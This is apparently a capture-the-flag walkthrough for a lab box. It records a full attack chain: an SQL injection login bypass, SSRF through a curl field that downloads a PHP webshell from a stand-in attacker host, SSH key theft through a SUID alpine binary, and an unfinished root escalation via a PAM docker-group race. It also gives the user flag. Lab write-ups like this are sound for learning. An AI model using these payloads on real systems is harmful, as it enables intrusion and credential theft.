# CTF "Escalate" Walkthrough — aclabs.pro (10.10.10.224)

## Full Attack Chain

### 1. SQLi Login Bypass
- Target: `POST /` with `username=' OR '1'='1'--`
- Backend: SQLite3 at `/tmp/ctf.db`
- Query: `SELECT * FROM users WHERE username = '$username' AND password = '$password'`
- Created user `admin` with password `dummy_fuck` (default seed data)

### 2. SSRF → Webshell via curl Executor
- Authenticated dashboard has a "curl executor" input field
- Input is parsed: extracts URL via `filter_var(FILTER_VALIDATE_URL)`, passes rest as curl flags
- File read: `file:///etc/passwd`
- File write: `http://attacker/payload.php -o uploads/shell2.php`
- PHP payload: `<?php passthru($_GET["c"]); ?>`
- Webshell at: `http://target/uploads/shell2.php?c=id`

### 3. SUID Alpine → SSH Key Extraction
- Found SUID binary: `/usr/bin/alpine` (owner: `developer:developer`, mode: 4755)
- Alpine is an interactive email client — requires PTY
- Technique: Python `pty.openpty()` + fork + execve
  - Parent captures PTY output
  - Child runs alpine with `-F /home/developer/.ssh/id_rsa` (file view mode)
  - After file displays, send `S` keystroke to save
  - Save path: `/tmp/exported_key`
  - Confirm with `y`
- Extracted key: OpenSSH private key (ed25519 or rsa)
- Key file permissions: `developer:www-data` (owner from SUID, group from www-data's cwd)

### 4. SSH as developer
- Copied key to `/tmp/.ssh/id_rsa` with mode 600
- SSH: `ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -i /tmp/.ssh/id_rsa developer@127.0.0.1`
- Got: `uid=1000(developer) gid=1000(developer)`

### 5. User Flag
- `cat /home/developer/user.md` → `flag_f63e1d054ed120b428743b4285eb8159`

## Root Escalation Path (Unresolved)

### PAM Docker Group Race
- PAM config in `/etc/pam.d/sshd` includes:
  - `session optional pam_exec.so seteuid /usr/local/bin/add-docker-group.sh`
  - `session optional pam_exec.so seteuid /usr/local/bin/remove-docker-group.sh`
- `add-docker-group.sh`: increments counter in `/run/docker-sessions/${USER}.count`
  - If count == 1: `(sleep 10; usermod -aG docker $USER) &`
  - If count > 1: `gpasswd -d $USER docker` (removes immediately)
- `remove-docker-group.sh`: decrements counter, removes from docker if count <= 0
- `/run/docker-sessions/` is world-writable (`drwxrwxr-x`)
- `/etc/group` confirmed `docker:x:104:developer` after script ran
- **Problem**: SSH session groups set by `initgroups()` BEFORE PAM session scripts run
- **Problem**: `sg docker` and `newgrp docker` require TTY (not available via webshell)
- **Comment in script**: "удаление происходит слишком поздно" (removal happens too late) — hint at race

### SUID Bash Alternative
- `/usr/bin/alpine` was replaced with a SUID bash (developer:developer)
- Bash with `-p` flag preserves SUID (euid=1000/developer)
- **Problem**: Supplementary groups inherited from parent (www-data), not from /etc/group
- `initgroups()` requires CAP_SETGID — not available
- `ctypes.libc.initgroups()` returns -1 (Operation not permitted)

### Blocked Approaches
- `/usr/local/bin/add-docker-group.sh` is NOT writable despite 0775 (ext4 mount, no overlay)
- `gcc` not installed on target
- Docker socket: `srw-rw---- root:docker` — needs docker group membership
- AppArmor: module loaded but no docker profile found
- `sg`/`newgrp`: "Permission denied" — requires password even for user's own groups

## Key Files
| Path | Purpose |
|------|---------|
| `/var/www/html/index.php` | Main app (SQLi, curl executor) |
| `/tmp/ctf.db` | SQLite database |
| `/usr/bin/alpine` | SUID binary (developer:developer) |
| `/usr/local/bin/add-docker-group.sh` | PAM script (adds docker group) |
| `/usr/local/bin/remove-docker-group.sh` | PAM script (removes docker group) |
| `/run/docker-sessions/` | World-writable counter dir |
| `/home/developer/user.md` | User flag |
| `/var/run/docker.sock` | Docker API socket |
